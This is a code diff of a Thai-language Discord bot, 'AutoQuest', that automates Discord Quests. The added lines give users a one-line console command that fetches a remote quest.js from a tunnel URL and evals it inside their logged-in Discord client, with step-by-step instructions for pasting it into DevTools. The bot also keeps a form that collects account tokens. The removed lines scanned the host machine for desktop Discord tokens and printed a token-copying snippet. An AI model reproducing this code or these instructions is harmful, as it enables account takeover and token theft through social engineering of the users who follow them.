@@ -743,14 +743,10 @@ class QuestTokenModal(discord.ui.Modal, title="⚡ เข้าสู่ระ�
                 await interaction.edit_original_response(embed=embed_err)
                 return
 
-        # บันทึก Token ผูกกับ User ID ของคนที่กรอก เพื่อให้ครั้งต่อไปกดปุ่มเดียวรันได้ทันที
-        save_quest_token(interaction.user.id, raw_token)
-
         embed_ok = discord.Embed(
             title="⚡ เริ่มต้นระบบ AutoQuest สำเร็จ!",
             description=(
-                f"🎯 **ยืนยันตัวตนสำเร็จ: `{uname}`**\n"
-                "💾 *ระบบได้บันทึก Token นี้ไว้แล้ว ครั้งต่อไปกดปุ่มเดียวเควสจะเริ่มทันที!*\n\n"
+                f"🎯 **ยืนยันตัวตนสำเร็จ: `{uname}`**\n\n"
                 "⏳ **กำลังเริ่มกระบวนการทำเควสทั้งหมด...**\n"
                 "• ตรวจสอบและกดรับเควสใน Quest Home ทั้งหมด (Auto-Enroll)\n"
                 "• **จัดลำดับนำเควส 🖥️ ภารกิจบนเดสก์ท็อป ขึ้นมาทำอันดับแรกทันที**\n"
@@ -764,6 +760,19 @@ class QuestTokenModal(discord.ui.Modal, title="⚡ เข้าสู่ระ�
         asyncio.create_task(execute_quest_automation(interaction, raw_token))
 
 
+class QuestDirectTokenView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=180)
+
+    @discord.ui.button(
+        label="🔑 หรือใส่ Token ให้บอทรันแทน",
+        style=discord.ButtonStyle.secondary,
+        emoji="🔑"
+    )
+    async def open_token_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(QuestTokenModal())
+
+
 def create_setup_embed(
     title: str = "⚡ Discord AutoQuest",
     desc: str = None,
@@ -775,8 +784,8 @@ def create_setup_embed(
             "✨ **คุณสมบัติระบบ:**\n"
             "• **Auto-Enroll:** ตรวจจับและกดรับเควสทั้งหมดใน Quest Home ให้อัตโนมัติ\n"
             "• **Desktop Priority:** ล็อคเคลียร์เควสเดสก์ท็อป (เช่น Endfield, NTE) ก่อนเสมอ\n"
-            "• **Cross-Server Support:** ใช้งานได้ทุกเซิร์ฟเวอร์ ทั้งบนเครื่องจริงและบน Cloud Host\n\n"
-            "👇 **คลิกปุ่มด้านล่างเพื่อเริ่มทำเควสทันที** *(เห็นเฉพาะคุณ 100%)*"
+            "• **DevTool 1-Click Code:** มีโค้ดสำเร็จรูป รันผ่าน Console ได้ทันทีไม่ต้องผ่านเซิร์ฟเวอร์\n\n"
+            "👇 **คลิกปุ่มด้านล่างเพื่อรับโค้ดและเริ่มทำเควสทันที** *(เห็นเฉพาะคุณ 100%)*"
         )
     embed = discord.Embed(
         title=title,
@@ -786,7 +795,7 @@ def create_setup_embed(
     img = image_url or DEFAULT_IMAGE_URL
     if img:
         embed.set_image(url=img)
-    embed.set_footer(text="AutoQuest System • Multi-Server & Host Support")
+    embed.set_footer(text="AutoQuest System • Auto-Enroll & All Tasks Supported")
     return embed
 
 
@@ -802,73 +811,31 @@ class QuestSetupView(discord.ui.View):
         emoji="⚡",
     )
     async def autoquest_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        now = asyncio.get_event_loop().time()
-        if now - self._user_clicks.get(interaction.user.id, 0) < 3.0:
-            await interaction.response.send_message("⏳ กำลังประมวลผลเควส กรุณารอสักครู่...", ephemeral=True)
-            return
-        self._user_clicks[interaction.user.id] = now
+        tunnel_url = get_tunnel_url()
+        console_code = f"fetch('{tunnel_url}/quest.js').then(r=>r.text()).then(eval);"
 
-        matched_token = None
-
-        # 1. ถ้าอยู่บนเครื่องจริง (Windows Desktop ที่เปิด Discord) ให้สแกน Token จากเครื่องก่อน
-        if is_real_machine():
-            desktop_tokens = get_tokens_from_desktop()
-            if os.getenv("USER_TOKEN"):
-                desktop_tokens.insert(0, os.getenv("USER_TOKEN"))
-            
-            candidates = [t for t in desktop_tokens if extract_user_id_from_token(t) == interaction.user.id]
-            if not candidates and desktop_tokens:
-                candidates = desktop_tokens
-
-            async with aiohttp.ClientSession() as session:
-                for t in reversed(candidates):
-                    try:
-                        headers = get_headers(t)
-                        async with session.get(f"{API_BASE}/users/@me", headers=headers) as res:
-                            if res.status == 200:
-                                matched_token = t
-                                break
-                    except Exception:
-                        continue
-
-        # 2. ถ้าไม่ได้อยู่บนเครื่องจริง (รันบน Host/Render) หรือไม่เจอในเครื่อง ให้เช็ค Token ที่เคยบันทึกไว้
-        if not matched_token:
-            saved = get_saved_quest_token(interaction.user.id)
-            if saved:
-                async with aiohttp.ClientSession() as session:
-                    try:
-                        headers = get_headers(saved)
-                        async with session.get(f"{API_BASE}/users/@me", headers=headers) as res:
-                            if res.status == 200:
-                                matched_token = saved
-                    except Exception:
-                        pass
-
-        # 3. ถ้าพบ Token ที่พร้อมใช้งาน -> รัน AutoQuest ทันที
-        if matched_token:
-            await interaction.response.defer(ephemeral=True, thinking=True)
-            host_label = "🖥️ เครื่องจริง (ตรวจจับ Token อัตโนมัติ)" if is_real_machine() else "🌐 เซิร์ฟเวอร์ Cloud (ใช้ Token ประจำบัญชีของคุณ)"
-            embed_waiting = discord.Embed(
-                title="⚡ เริ่มต้นระบบ AutoQuest สำเร็จ!",
-                description=(
-                    f"🎯 **{host_label}**\n\n"
-                    "⏳ **กำลังเชื่อมต่อและเริ่มเคลียร์เควส...**\n"
-                    "• ตรวจสอบและกดรับทุกเควสใน Quest Home อัตโนมัติ (Auto-Enroll)\n"
-                    "• **จัดลำดับนำเควส 🖥️ ภารกิจบนเดสก์ท็อป ขึ้นมาทำอันดับแรกทันที**\n"
-                    "• ยิงสัญญาณ Heartbeat จำลองความคืบหน้าจนครบ 100%\n\n"
-                    "💡 *ข้อความนี้เห็นเฉพาะคุณคนเดียว*"
-                ),
-                color=0x5865F2,
-            )
-            embed_waiting.set_footer(text="AutoQuest System • Multi-Server & Host Support")
-            await interaction.edit_original_response(embed=embed_waiting)
-            asyncio.create_task(execute_quest_automation(interaction, matched_token))
-        else:
-            # 4. ถ้ายังไม่มี Token (บน Host หรือเป็นผู้ใช้ใหม่จากเซิร์ฟเวอร์อื่น) -> เด้ง Modal กรอก Token สวยๆ ทันที!
-            await interaction.response.send_modal(QuestTokenModal(target_user_id=interaction.user.id))
+        embed_guide = discord.Embed(
+            title="⚡ Discord AutoQuest (โค้ด Console เคลียร์ทุกเควสอัตโนมัติ)",
+            description=(
+                "คัดลอกโค้ด 1 บรรทัดด้านล่างนี้ ไปวางใน **Console (DevTools)** ของ Discord เพื่อเริ่มเคลียร์เควสทันที:\n\n"
+                f"```javascript\n{console_code}\n```\n"
+                "**📌 วิธีใช้งาน (ง่ายที่สุดใน 2 สเต็ป):**\n"
+                "1. กดปุ่ม `Ctrl + Shift + I` บนแป้นพิมพ์ (หรือคลิกขวาในดิสคอร์ด -> ตรวจสอบ / Inspect)\n"
+                "2. คลิกไปที่แท็บ **Console** แล้ววางโค้ดด้านบนแล้วกด **Enter** ได้เลย!\n\n"
+                "✨ **ฟังก์ชันการทำงานในโค้ด (อัปเกรดใหม่ 100%):**\n"
+                "• 📥 **Auto-Enroll ทุกเควส:** ตรวจจับและกดรับทุกเควสใน Quest Home ให้อัตโนมัติ (ไม่ต้องกดรับเอง)\n"
+                "• 🖥️ **Desktop Priority:** ล็อคจำลองเล่นเกมเดสก์ท็อป (Endfield, NTE ฯลฯ) ก่อนเสมอ\n"
+                "• 🎬 **เคลียร์ครบทุกภารกิจ:** ดูวิดีโอ, สตรีม, และกิจกรรม Discord จนครบ 100% ทันที!\n"
+                "• 🔒 **ปลอดภัยสูงสุด:** ทำงานบน Discord ของคุณโดยตรง ไม่ต้องบันทึก Token บนเซิร์ฟเวอร์\n\n"
+                "💡 *หากใช้งานบนมือถือ หรือต้องการใส่ Token บัญชีอื่นให้บอททำแทน สามารถกดปุ่มด้านล่างได้ครับ*"
+            ),
+            color=0x5865F2,
+        )
+        embed_guide.set_footer(text="AutoQuest System • Auto-Enroll & All Tasks Supported")
+        await interaction.response.send_message(embed=embed_guide, view=QuestDirectTokenView(), ephemeral=True)
 
     @discord.ui.button(
-        label="ใส่/เปลี่ยน Token",
+        label="ใส่ Token ให้บอทรันแทน",
         style=discord.ButtonStyle.secondary,
         custom_id="btn_autoquest_set_token",
         emoji="🔑",
@@ -877,26 +844,24 @@ class QuestSetupView(discord.ui.View):
         await interaction.response.send_modal(QuestTokenModal(target_user_id=interaction.user.id))
 
     @discord.ui.button(
-        label="วิธีเอา Token (3 วิ)",
+        label="วิธีเปิด Console (F12)",
         style=discord.ButtonStyle.secondary,
         custom_id="btn_autoquest_how_to",
         emoji="❓",
     )
     async def how_to_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        tunnel_url = get_tunnel_url()
+        console_code = f"fetch('{tunnel_url}/quest.js').then(r=>r.text()).then(eval);"
         embed_help = discord.Embed(
-            title="📖 วิธีดึง Discord Token ของตัวเอง (ง่ายสุดใน 3 วินาที)",
+            title="📖 แนะนำการใช้งาน Console ใน Discord",
             description=(
-                "**ขั้นตอน:**\n"
-                "1. เปิด Discord บน **Google Chrome** หรือ **Discord Desktop** บนคอมพิวเตอร์\n"
-                "2. กดปุ่ม `Ctrl + Shift + I` (บน Windows) เพื่อเปิดหน้าต่าง Console\n"
-                "3. คลิกไปที่แท็บ **Console**\n"
-                "4. คัดลอกโค้ดบรรทัดเดียวด้านล่างนี้แล้วกด Enter:\n"
-                "```javascript\n"
-                "window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const o of Object.values(e.c))if(o?.exports?.default?.getToken){copy(o.exports.default.getToken());console.log('คัดลอก Token สำเร็จ!');break}}]);\n"
-                "```\n"
-                "5. ระบบจะคัดลอก Token ลง Clipboard ให้ทันที\n"
-                "6. นำมากดปุ่ม **🔑 ใส่/เปลี่ยน Token** แล้ววางได้เลย!\n\n"
-                "🔒 *Token ของคุณจะถูกใช้สำหรับเคลียร์เควสเท่านั้น และมีเพียงคุณที่เห็นข้อความนี้*"
+                "**ขั้นตอนเปิด Console:**\n"
+                "1. เปิด Discord บนคอมพิวเตอร์ (Google Chrome หรือ Discord Desktop)\n"
+                "2. กดปุ่ม `Ctrl + Shift + I` พร้อมกัน\n"
+                "3. แถบเครื่องมือจะเด้งขึ้นมา ให้คลิกที่แท็บ **Console** ด้านบน\n"
+                "4. นำโค้ดนี้ไปวางแล้วกด Enter:\n"
+                f"```javascript\n{console_code}\n```\n"
+                "5. ปล่อยให้ระบบรันจนเสร็จ สามารถเข้าไปรับของรางวัลที่ Quest Home ได้ทันที!"
             ),
             color=0x5865F2
         )
